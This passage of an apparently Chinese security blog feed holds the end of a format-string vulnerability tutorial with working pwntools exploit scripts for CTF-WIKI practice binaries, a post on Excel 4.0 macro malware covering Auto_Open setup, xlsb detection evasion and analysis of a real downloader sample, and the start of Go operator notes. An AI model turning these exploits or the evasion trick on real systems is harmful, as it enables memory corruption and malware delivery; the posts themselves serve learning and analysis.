offset]</span><span class="hljs-variable">$n</span><br></code></pre></div></td></tr></table></figure><p>在这其中，<code>...</code>表示需要填充的内容，<code>overwrite addr</code> 是需要覆盖的地址，<code>overwrite offset</code>表示需要覆盖的地址存储位置是输出函数格式化字符串的第几个参数。由此确定几个步骤：</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先是要确定覆盖的地址，在这个程序中，就是需要知道变量C的地址，这个示例作为学习，就在代码中直接输出了变量C的地址，比较简单。</p><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>通过调试确定输入的格式化字符串是第几个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.png"></p><p>调试之后，可以看到，格式化字符串是第六个参数。</p><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>现在已经知道了要覆盖的地址，还有覆盖的是第几个参数，现在就可以来尝试进行覆盖了。构造的payload如下，首先是变量C的存储地址，程序会打印，只需要接收即可，然后是<code>%012d</code>，刚才知道<code>%n</code>会把成功输出的字符个数写入，所以地址是四个字节，现在还需要十二个，就是十六。然后是<code>%6$n</code>，刚才分析过，是第六个参数。</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></div></td></tr></table></figure><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *    <br>sh = process(<span class="hljs-string">&#x27;./3&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p>看到结果已经成功输出了当C=16时的字符串。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>现在来考虑一下如何修改<code>data</code>段的变量，将其修改为一个较小的数字，比如说小于机器字长的数字，比如说2。根据前面的例子，我们知道，前面是地址，而这个地址最少都是四字节（32位），所以无论如何都不会小于四字节。</p><p>现在就需要重新构建一下payload，可以把地址放在中间，而不需要将其放在最前面，只要能够找到对应的偏移量，也是可以得到对应的数值。刚才那个程序，我们已经分析过格式化字符串是第六个参数，要将2写到指定位置的话，那么地址不能放在前面，前面可以放两个字节任意字符，<code>XX%n</code>，此时这已经是第六个参数，然后是<code>$xXX</code>，这就是第七个参数，最后就是地址，也就是第八个参数，那么此时的payload就可以是以下的形式</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">XX%8$nXX[addr]<br></code></pre></div></td></tr></table></figure><p>现在尝试覆盖a的地址，因为a是一个已经初始过得全局变量，在IDA中可以直接看到地址。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.png"></p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br>a_addr = <span class="hljs-number">0x804a024</span><br>payload = <span class="hljs-string">&quot;aa%8$naa&quot;</span> + p32(a_addr)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>看到成功输出了a=2的信息。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/12.png"></p><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>刚才是覆盖小数字，现在来尝试覆盖大数字。首先来了解一下变量在内存中的存储格式。所有的变量在内存中都是以字节进行存储的，然后都是以小端序进行存储的。再来回忆一下格式化字符串里面的标志，发现有这样两个标志：</p><ul><li><code>hh</code>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</li><li><code>h</code>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</li></ul><p>确定一下写入的地址，可以直接在IDA中看到，变量b的地址是<code>0x804A028</code>，此时想要的覆盖效果如下：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0x0804A028</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">78</span><br><span class="hljs-attribute">0x0804A029</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">56</span><br><span class="hljs-attribute">0x0804A02a</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">34</span><br><span class="hljs-attribute">0x0804A02b</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><p>直接利用wiki中的模板进行计算</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></div></td></tr></table></figure><p>完整的EXP如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></div></td></tr></table></figure><p>成功输出对应信息</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/13.png"></p><p>了解到在<code>pwntools</code>中还有工具<code>fmtstr_payload</code>，可以直接拿来进行计算。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">028</span>:<span class="hljs-number">0</span>x<span class="hljs-number">12345678</span>&#125;)<br><span class="hljs-attribute">print</span> payload<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p>其中第一个参数为偏移，第二个表示写入的数据，数据地址，以及要写入的信息。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/14.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="64位程序格式化字符串漏洞"><a href="#64位程序格式化字符串漏洞" class="headerlink" title="64位程序格式化字符串漏洞"></a>64位程序格式化字符串漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>对于64位的程序与32位的偏移计算是类似的，只不过64位函数的前6个参数是存储在相应的寄存器中的。而对于漏洞，程序依旧会按照格式化字符串相应格式对其进行解析。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例题<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a></p><p>查看一下保护机制</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/15.png"></p><p>分析程序，看到漏洞点</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/16.png"></p><p>使用gdb调试程序，断在<code>printf</code>之前，看到此时的找情况，我们想要的<code>flag</code>在第四个位置，然后这是一个64位的程序，对应的前六个参数都会存在寄存器之中，加上这个偏移量就是10，然后还有一个格式化字符串，作为它的参数，偏移量就是9。所以输入<code>%9$s</code>即可。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/17.png"></p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/18.png"></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;%9$s&#x27;</span>)<br><span class="hljs-built_in">print</span> sh.recv()<br></code></pre></div></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要都是参考了CTF-WIKI中的内容，一些文字性的内容，也没有修改，都是直接写了wiki中的内容，感觉自己总结能力也比较差，很多东西写的没人家好，还有一些例子我并没有做，主要目前还不是很懂一些知识点，先挖个坑吧，等以后慢慢再回过头来学习。</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Macro 4.0总结</title>
    <link href="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/"/>
    <url>/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周碰到了一个Excel 宏4.0的<code>xlsb</code>样本，也算是分析的第一个宏病毒，起初对于宏的提取完全没有用，用了很长时间才成功提取并且看到宏代码，所以来稍微的总结一下关于宏4.0的东西。</p><p>宏4.0最早在1992年在Excel 4.0版本中引入，是Visual Basic for Applications (VBA) 的前身，和现在的VBA宏不一样，宏4.0可以直接写在表格里。而现在这种老技术又重新流行了起来，主要是这种宏比VBA宏有更好的免杀性。它不依赖于错误，也不是漏洞利用，只是滥用合法的excel功能。一些样本受密码保护，代码混淆，工作表隐藏，以及一些检测机制，使得对于它的分析难度会提高。还有将其保存为<code>xlsb</code>文件，而不是<code>xlsm</code>文件时，一些检测的手段会直接失效，现在来尝试总结分析一下Excel 4.0的手段。</p><h2 id="宏4-0-利用"><a href="#宏4-0-利用" class="headerlink" title="宏4.0 利用"></a>宏4.0 利用</h2><p>现在来演示一下如何利用宏4.0</p><h3 id="宏的利用"><a href="#宏的利用" class="headerlink" title="宏的利用"></a>宏的利用</h3><p>在某个工作表上右键，选择插入</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/1.png"></p><p>在弹框中选择MS Excel4.0</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/2.png"></p><p>在新创建的工作表中，在框中输入宏指令，然后右键选择执行。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/3.png"></p><h3 id="自动加载方式"><a href="#自动加载方式" class="headerlink" title="自动加载方式"></a>自动加载方式</h3><p>现在主流的自动加载的方式分别是<code>Auto_Open</code>和<code>Auto_Close</code></p><ul><li><code>Auto_Open</code>会在用户打开文档的时候自动运行</li><li><code>Auto_Close</code>会在用户关闭文档的时候自动运行</li></ul><p>上述两种方式自动运行都需要用户允许执行宏代码。</p><p>将单元格名称改为<code>Auto_Open</code>，就实现了宏的自动加载。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/4.png"></p><p>保存之后，再打开，会看到宏的警告</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/5.png"></p><p>点击允许，就会弹窗</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/6.png"></p><h3 id="查看宏代码"><a href="#查看宏代码" class="headerlink" title="查看宏代码"></a>查看宏代码</h3><p>当我们按下<code>alt+F11</code>查看宏代码的时候，发现这样是不能够查看到宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/7.png"></p><p>默认情况下，XLM宏代码存储在xl\Macrosheets\下的Sheet1.xml中，解压此xlsm文件，然后打开位于目录中的Sheet1.xml，可以看到刚才写入的宏代码。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/8.png"></p><p>但是这种查看方式，只适用于<code>xlsm</code>格式的文件，如果是<code>xlsb</code>的文件，就没办法看了。可以看到里面都是<code>bin</code>文件，查看不了里面的具体内容。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/9.png"></p><p>对于<code>xlsm</code>来说，里面的内容都是基于XML的，可以直接打开进行阅读，而<code>xlsb</code>的文件内容则是二进制文件，是没办法直接阅读的。</p><h2 id="oletools使用"><a href="#oletools使用" class="headerlink" title="oletools使用"></a>oletools使用</h2><p>使用工具可以快速的帮助我们进行宏代码的查看</p><p><a href="https://github.com/decalage2/oletools">oletools</a>用于帮助分析ole文件，使用它可以帮助我们分析ole文件中是否存在宏代码。</p><p>安装好工具后可以开始测试，将刚才的文件保存为test.xlsm来进行测试。</p><p><code>oleid</code>可以查看文件是否存在宏代码，查看test.xlsm文件，看到提示存在<code>XLM Macros</code></p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/11.png"></p><p>使用<code>olevba</code>可以从MS Office 文档（OLE 和 OpenXML）中提取和分析 VBA 宏源代码，查看test.xlsm，看到成功提取出宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/12.png"></p><p>一切保持不变，现在只是将文件保存为<code>xlsb</code>类型的文件，测试看看。</p><p>可以看到没有做任何其他的处理，仅仅只是保存为<code>xlsb</code>文件，其中包含的宏 4.0代码就可以没有办法被检测出来。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/13.png"></p><p>针对存在宏 4.0的<code>xlsb</code>文件，如何提取其中的宏，我们从一个真实的样本入手</p><p>如何提取出来<code>xlsb</code>文件的宏 4.0，我们从一个真实的样本入手。</p><h2 id="真实样本分析"><a href="#真实样本分析" class="headerlink" title="真实样本分析"></a>真实样本分析</h2><p>样本MD5：cf508cefa3b3f03c1d8300f5f57b9af6</p><p><a href="https://app.any.run/tasks/ca651eb1-bf93-4ded-a592-74e502ab444d/">样本下载地址</a></p><p>此文件是一个XLSB文件</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/14.png"></p><p>打开会提示其中还有宏</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/15.png"></p><p>按下<code>alt+F11</code>看不到任何VBA宏的存在，使用oletools工具同样也无法检测到宏。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/18.png"></p><p>看到其存在两个隐藏的工作表</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/16.png"></p><p>显示隐藏的工作表，看到上面的单元格直接从C到了H，中间被隐藏起来了，另一个工作表也是如此，那么宏代码应该就是在其中了，但是因为工作表被保护起来了，我们没有密码，所以我们无法移动单元格。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/17.png"></p><p>现在来尝试获取<code>xlsb</code>中的宏 4.0代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><a href="https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442">https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442</a></p><p>按照上述这篇帖子的方法，可以成功绕过密码保护，我们修改单元格长度之后，再修改一下字体颜色（原始字体颜色为白色，隐藏了起来）就可以看到宏代码。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/19.png"></p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/20.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用工具Cerbero Suite</p><p><a href="https://cerbero.io/">Cerbero Suite</a></p><p>使用此工具，不像刚才那样那么麻烦，可以直接看到工作表中的宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/21.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>使用XLMMacroDeobfuscator</p><p><a href="https://github.com/DissectMalware/XLMMacroDeobfuscator">XLMMacroDeobfuscator</a></p><p>这个工具可以非常快速查看宏代码，使用也非常简单，它会自动帮助我们分析其中的宏，并且可以去混淆</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">xlmdeobfuscator -f [指定要检测的文件]<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/22.png"></p><p>由上图可以清晰的看到其中存在的去混淆后的宏代码</p><p>看到它主要是下载了6个文件存在指定的位置，并且调用<code>regsvr32</code>来启动下载的文件。</p><p>对于下载的文件，只分析出了一小部分的行为，很多关键的地方都没有看懂，所以暂时不放出来，等以后分析明白再放出来。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.yuque.com/p1ut0/qtmgyx/rqank4">https://www.yuque.com/p1ut0/qtmgyx/rqank4</a></p><p><a href="https://zvelo.com/excel-4-0-macros-another-old-school-attack-method/">https://zvelo.com/excel-4-0-macros-another-old-school-attack-method/</a></p><p><a href="https://madlabs.dsu.edu/madrid/blog/2021/05/17/analyzing-document-with-malicious-excel-4-0-macros/">https://madlabs.dsu.edu/madrid/blog/2021/05/17/analyzing-document-with-malicious-excel-4-0-macros/</a></p><p><a href="https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442">https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442</a></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>宏病毒</tag>
      
      <tag>Macro 4.0</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言学习笔记二</title>
    <link href="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <url>/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="Go语言运算符"><a href="#Go语言运算符" class="headerlink" title="Go语言运算符"></a>Go语言运算符</h2><p>运算符用于在程序运行时执行数学或者逻辑运算</p><p>Go语言内置的运算符有：</p><ul><li>算术运算符</li><li>关系运算符</li><li>逻辑运算符</li><li>位运算符</li><li>赋值运算符</li><li>其他运算符</li></ul><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>相加</td></tr><tr><td>-</td><td>相减</td></tr><tr><td>*</td><td>相乘</td></tr><tr><td>/</td><td>相除</td></tr><tr><td>%</td><td>求余</td></tr><tr><td>++</td><td>自增</td></tr><tr><td>–</td><td>自减</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span> = <span class="hljs-number">20</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span> = <span class="hljs-number">10</span><br>fmt.Println(<span class="hljs-string">&quot;a + b =&quot;</span>, a+b)<br>fmt.Println(<span class="hljs-string">&quot;a - b =&quot;</span>, a-b)<br>fmt.Println(<span class="hljs-string">&quot;a * b =&quot;</span>, a*b)<br>fmt.Println(<span class="hljs-string">&quot;a / b =&quot;</span>, a/b)<br>fmt.Println(<span class="hljs-string">&quot;a % b =&quot;</span>, a%b)<br>a++<br>b--<br>fmt.Printf(<span class="hljs-string">&quot;a = %d, b = %d&quot;</span>, a, b)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/1.png"></p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>检查两个值是否相等，如果相等返回true，否则返回false</td></tr><tr><td>!=</td><td>检查两个值是否不相等，如果不相等返回true，否则返回false</td></tr><tr><td>&gt;</td><td>检查左边值是否大于右边值，如果是返回true，否则返回false</td></tr><tr><td>&lt;</td><td>检查左边值是否小于右边值，如果是返回true，否则返回false</td></tr><tr><td>&gt;=</td><td>检查左边值是否大于等于右边值，如果是返回true，否则返回false</td></tr><tr><td>&lt;=</td><td>检查左边值是否小于等于右边值，如果是返回true，否则返回false</td></tr></tbody></table><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> int = <span class="hljs-number">20</span><br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> int = <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> == <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a=b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a!=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span 